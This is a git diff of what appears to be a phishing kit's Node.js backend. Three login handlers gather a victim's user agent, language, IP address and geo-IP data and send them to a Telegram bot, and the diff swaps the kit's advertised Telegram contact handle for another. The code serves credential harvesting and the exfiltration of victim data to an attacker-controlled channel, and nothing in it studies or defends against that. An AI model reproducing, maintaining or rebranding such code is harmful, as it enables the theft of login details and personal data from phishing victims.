@@ -49,7 +49,7 @@ exports.loginPost = async (req, res) => {
         `💻 SYSTEM INFO\n` +
         `USER AGENT       : ${userAgent}\n` +
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n` +
+        `💬 Telegram: https://t.me/kingdeer7000s\n` +
 		`🌐 Website: Coming soon!!\n`;
 
     const sendMessage = sendMessageFor(botToken, chatId);
@@ -104,7 +104,7 @@ exports.loginPost2 = async (req, res) => {
             `🌍 GEO-IP INFO\n` +
           `IP ADDRESS       : ${ipAddress}\n` +
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-            `💬 Telegram: https://t.me/UpdateTeams\n`;
+            `💬 Telegram: https://t.me/kingdeer7000s\n`;
             
 
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
@@ -153,7 +153,7 @@ exports.loginPost3 = async (req, res) => {
             `🌍 GEO-IP INFO\n` +
           `IP ADDRESS       : ${ipAddress}\n` +
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-            `💬 Telegram: https://t.me/UpdateTeams\n`;
+            `💬 Telegram: https://t.me/kingdeer7000s\n`;
             
 
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
